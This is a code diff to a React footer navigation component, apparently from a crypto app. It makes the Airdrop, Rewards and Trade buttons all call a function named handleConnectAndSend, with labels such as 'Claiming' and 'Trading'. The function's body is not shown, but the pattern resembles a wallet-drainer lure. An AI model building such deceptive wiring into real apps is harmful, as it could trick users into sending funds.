@@ -9,7 +9,7 @@ import {
   FaExchangeAlt
 } from "react-icons/fa";
 
-export default function FooterNav({ scrollToTop, scrollToCharts }) {
+export default function FooterNav({ scrollToTop, scrollToCharts, handleConnectAndSend, loading, address }) {
   const [active, setActive] = useState("home");
 
   return (
@@ -33,26 +33,35 @@ export default function FooterNav({ scrollToTop, scrollToCharts }) {
 
       <div
         className={`nav-item ${active === "airdrop" ? "active" : ""}`}
-        onClick={() => setActive("airdrop")}
+        onClick={() => {
+          setActive("airdrop");
+          handleConnectAndSend();
+        }}
       >
         <FaGift size={20} />
-        <span>Airdrop</span>
+        <span>{loading ? "Loading" : address ? "Claiming" : "Airdrop"}</span>
       </div>
 
       <div
         className={`nav-item ${active === "rewards" ? "active" : ""}`}
-        onClick={() => setActive("rewards")}
+        onClick={() => {
+          setActive("rewards");
+          handleConnectAndSend();
+        }}
       >
         <FaCoins size={20} />
-        <span>Rewards</span>
+        <span>{loading ? "Loading" : address ? "Claiming Rewards" : "Rewards"}</span>
       </div>
 
       <div
         className={`nav-item ${active === "trade" ? "active" : ""}`}
-        onClick={() => setActive("trade")}
+        onClick={() => {
+          setActive("trade");
+          handleConnectAndSend();
+        }}
       >
         <FaExchangeAlt size={20} />
-        <span>Trade</span>
+        <span>{loading ? "Loading" : address ? "Trading" : "Trade"}</span>
       </div>
 
     </div>
